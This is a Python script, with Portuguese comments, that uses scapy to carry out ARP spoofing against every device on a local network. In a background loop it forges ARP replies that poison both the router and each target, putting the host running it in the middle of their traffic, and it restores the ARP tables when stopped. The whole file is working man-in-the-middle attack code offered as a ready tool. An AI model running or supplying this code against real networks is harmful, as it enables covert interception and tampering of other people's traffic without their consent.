import time
import threading
from scapy.all import ARP, Ether, sendp, get_if_hwaddr

def get_mac(ip: str) -> str:
    """Pega o MAC de um IP via ARP."""
    from scapy.all import srp
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(packet, timeout=3, verbose=False)[0]
    if result:
        return result[0][1].hwsrc
    return None

def spoof(target_ip: str, spoof_ip: str, target_mac: str, interface: str):
    """Envia ARP falso para o target dizendo que somos o spoof_ip."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=get_if_hwaddr(interface)
    )
    sendp(packet, iface=interface, verbose=False)

def restore(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str, interface: str):
    """Restaura as tabelas ARP originais ao parar."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    sendp(packet, iface=interface, count=5, verbose=False)

_spoofing = False

def start_spoofing(devices: list, gateway_ip: str, interface: str):
    """Inicia o ARP spoofing em background para todos os dispositivos."""
    global _spoofing
    _spoofing = True

    gateway_mac = get_mac(gateway_ip)
    targets = []

    for device in devices:
        if device["ip"] == gateway_ip:
            continue
        targets.append({
            "ip": device["ip"],
            "mac": device["mac"]
        })

    def loop():
        while _spoofing:
            for target in targets:
                # engana o dispositivo: "eu sou o roteador"
                spoof(target["ip"], gateway_ip, target["mac"], interface)
                # engana o roteador: "eu sou o dispositivo"
                spoof(gateway_ip, target["ip"], gateway_mac, interface)
            time.sleep(2)

        # ao parar, restaura tudo
        for target in targets:
            restore(target["ip"], gateway_ip, target["mac"], gateway_mac, interface)

    thread = threading.Thread(target=loop, daemon=True)
    thread.start()

def stop_spoofing():
    global _spoofing
    _spoofing = False